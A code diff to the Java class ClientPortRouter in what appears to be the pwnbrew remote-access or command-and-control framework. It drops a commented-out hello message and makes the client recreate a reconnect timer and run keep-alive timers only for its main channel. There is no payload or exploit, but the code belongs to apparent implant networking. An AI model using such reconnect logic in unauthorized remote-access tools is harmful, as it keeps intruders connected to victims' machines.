@@ -59,9 +59,7 @@ import pwnbrew.manager.OutgoingConnectionManager;
 import pwnbrew.utilities.Constants;
 import pwnbrew.utilities.DebugPrinter;
 import pwnbrew.utilities.ReconnectTimer;
-import pwnbrew.utilities.SocketUtilities;
 import pwnbrew.network.control.ControlMessageManager;
-import pwnbrew.network.control.messages.Hello;
 import pwnbrew.selector.ConnectHandler;
 import pwnbrew.selector.SocketChannelHandler;
 
@@ -223,13 +221,6 @@ public class ClientPortRouter extends PortRouter {
 
                 } else {
 
-                     //Send the hello message
-//                    String hostname;
-//                    try {
-//                        hostname = SocketUtilities.getHostname();
-//                    } catch (IOException ex) {
-//                        throw new LoggableException(ex);
-//                    }
 
                     SocketChannelHandler aSC = theOCM.getSocketChannelHandler( channedId );   
                     if( aSC != null ){
@@ -248,12 +239,6 @@ public class ClientPortRouter extends PortRouter {
                             
                             //Wait for the registration to complete
                             waitForConnection();
-                            
-//                            if( channedId == ConnectionManager.COMM_CHANNEL_ID ){                               
-//                                //Create a hello message and send it
-//                                Hello helloMessage = new Hello( hostname, channedId );
-//                                aCMManager.send( helloMessage );
-//                            }
                             
                         } catch(IOException ex){
                             throw new LoggableException(ex);
@@ -296,6 +281,11 @@ public class ClientPortRouter extends PortRouter {
 
         DebugPrinter.printMessage(NAME_Class, "Socket closed.");
         ReconnectTimer aReconnectTimer = theOCM.getReconnectTimer(channelId);
+        
+        //Create one if it doesn't exist
+        if( aReconnectTimer == null && channelId == ConnectionManager.COMM_CHANNEL_ID )
+            aReconnectTimer = new ReconnectTimer(ConnectionManager.COMM_CHANNEL_ID); 
+        
         if( aReconnectTimer != null && !aReconnectTimer.isRunning() && reconnectEnable ){
             
             DebugPrinter.printMessage(NAME_Class, "Starting Reconnect Timer");
@@ -412,12 +402,14 @@ public class ClientPortRouter extends PortRouter {
                         channelId = 0x0;
                     } else {
                         
-                        //Set the connected flag
-                        KeepAliveTimer theKeepAliveTimer = new KeepAliveTimer( thePortManager, channelId);
-                        theKeepAliveTimer.start();   
-                        
-                        //Set timer
-                        theOCM.setKeepAliveTimer( channelId, theKeepAliveTimer );
+                        if( channelId == ConnectionManager.COMM_CHANNEL_ID ){
+                            //Set the connected flag
+                            KeepAliveTimer theKeepAliveTimer = new KeepAliveTimer( thePortManager, channelId);
+                            theKeepAliveTimer.start();   
+
+                            //Set timer
+                            theOCM.setKeepAliveTimer( channelId, theKeepAliveTimer );
+                        }
                         
                     }
                 }
